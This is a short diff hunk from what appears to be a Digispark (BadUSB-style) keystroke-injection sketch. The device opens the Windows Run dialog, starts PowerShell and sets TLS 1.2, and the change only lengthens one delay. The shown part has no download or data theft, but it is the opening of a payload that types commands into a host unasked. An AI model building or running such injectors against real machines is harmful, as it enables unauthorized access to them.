@@ -59,7 +59,7 @@ DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
+DigiKeyboard.delay(750);
 DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
